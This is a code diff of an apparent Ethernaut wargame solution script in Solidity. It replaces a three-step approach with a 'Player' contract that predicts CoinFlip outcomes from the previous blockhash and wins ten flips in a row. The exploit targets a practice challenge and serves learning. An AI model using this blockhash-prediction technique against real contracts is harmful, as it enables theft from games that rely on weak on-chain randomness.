@@ -4,23 +4,42 @@ pragma solidity 0.8.21;
 import {Script, console2} from "forge-std/Script.sol";
 import {EthernautHelper} from "../setup/EthernautHelper.sol";
 
-// NOTE You can import your helper contracts & create interfaces here
-import {CoinFlipAttacker} from "../../src/03-CoinFlipAttacker.sol";
+// Import challenge contract here
+import {CoinFlip} from "../../challenge-contracts/03-CoinFlip.sol";
 
 contract CoinFlipSolution is Script, EthernautHelper {
     address constant LEVEL_ADDRESS = 0xA62fE5344FE62AdC1F356447B669E9E6D10abaaF;
     uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");
-    address challengeInstanceOnChain =
-        0xE17e4fb48D30f247F749a42Ab35E8465C1ac4732; // Change this address into yours after step1 executed.
-    address coinFlipAttackerAddress =
-        0x38eddcE71f8d83eBEfe41bEA8EEdb40d8A6e9b93; // Change this address into yours after step1 executed.
 
     function run() public {
         vm.startBroadcast(heroPrivateKey);
         // NOTE this is the address of your challenge contract
         address challengeInstance = createInstance(LEVEL_ADDRESS);
 
-        // Ric Li C's Solution
+        ////////////////////////////////////////////////////////////////////////////////////
+        // Start of Ric Li C's Solution
+        ////////////////////////////////////////////////////////////////////////////////////
+        // Step 1: Deploy Player contract;
+        Player caller = new Player(challengeInstance);
+
+        // Step 2: Call `play()` function in Player contract for 10 times;
+        uint blockNumber = block.number - 10;
+        for (uint i = 0; i < 10; i++) {
+            // `vm.roll()` is used to mimic block number;
+            // Can only mock past block number (mock future block number will get identical hash)
+            vm.roll(blockNumber + i);
+
+            // Calling `play()` function in Player contract;
+            // Player contract in turn calls `flip()` function in CoinFlip contract;
+            caller.play();
+        }
+
+        // Step 3: Confirm that `consecutiveWins` of CoinFlip contract is now `10`.
+        CoinFlip coin = CoinFlip(challengeInstance);
+        require(coin.consecutiveWins() == 10, "consecutiveWins check failed");
+        ////////////////////////////////////////////////////////////////////////////////////
+        // End of Ric Li C's Solution
+        ////////////////////////////////////////////////////////////////////////////////////
 
         // SUBMIT CHALLENGE. (DON'T EDIT)
         bool levelSuccess = submitInstance(challengeInstance);
@@ -29,62 +48,34 @@ contract CoinFlipSolution is Script, EthernautHelper {
 
         console2.log(successMessage(3));
     }
+}
 
-    /**
-     * Execute 1 time.
-     * Deployed challengeInstance and coinFlipAttacker contracts on Sepolia, then executed attack() function once.
-     * Ex. forge script ... ... --sig "step1()" --broadcast
-     */
-    function step1() public {
-        vm.startBroadcast(heroPrivateKey);
-        // NOTE this is the address of your challenge contract
-        address challengeInstance = createInstance(LEVEL_ADDRESS);
-        console2.log("challengeInstanceOnChain:", challengeInstance);
+////////////////////////////////////////////////////////////////////////////////////
+// Start of Ric Li C's Solution (Extra Contract)
+// Additional contract codes to help solve this puzzle
+////////////////////////////////////////////////////////////////////////////////////
+contract Player {
+    uint256 lastHash;
+    uint256 FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    CoinFlip coinFlip;
 
-        // YOUR SOLUTION HERE
-        CoinFlipAttacker coinFlipAttacker = new CoinFlipAttacker(
-            challengeInstance
-        );
-        console2.log("coinFlipAttackerAddress:", address(coinFlipAttacker));
-
-        console2.log("block.number:", block.number);
-        coinFlipAttacker.attack();
-
-        vm.stopBroadcast();
-
-        console2.log(successMessage(3));
+    constructor(address _coinFlipAddress) {
+        coinFlip = CoinFlip(_coinFlipAddress);
     }
 
-    /**
-     * Execute 9 times.
-     * Executed attack() function.
-     * Ex. forge script ... ... --sig "step2()" --broadcast
-     */
-    function step2() public {
-        vm.startBroadcast(heroPrivateKey);
-
-        console2.log("block.number:", block.number);
-        CoinFlipAttacker(coinFlipAttackerAddress).attack();
-
-        vm.stopBroadcast();
-
-        console2.log(successMessage(3));
+    function showWinNo() public view returns (uint) {
+        return coinFlip.consecutiveWins();
     }
 
-    /**
-     * Execute 1 time.
-     * Submitted challengeInstance.
-     * Ex. forge script ... ... --sig "step3()" --broadcast
-     */
-    function step3() public {
-        vm.startBroadcast(heroPrivateKey);
-
-        // SUBMIT CHALLENGE. (DON'T EDIT)
-        bool levelSuccess = submitInstance(challengeInstanceOnChain);
-        require(levelSuccess, "Challenge not passed yet");
-
-        vm.stopBroadcast();
-
-        console2.log(successMessage(3));
+    function play() public {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 side = blockValue / FACTOR;
+        bool guess = side == 1 ? true : false;
+        bool success = coinFlip.flip(guess);
+        require(success, "Guess wrongly");
     }
 }
+////////////////////////////////////////////////////////////////////////////////////
+// End of Ric Li C's Solution (Extra Contract)
+////////////////////////////////////////////////////////////////////////////////////
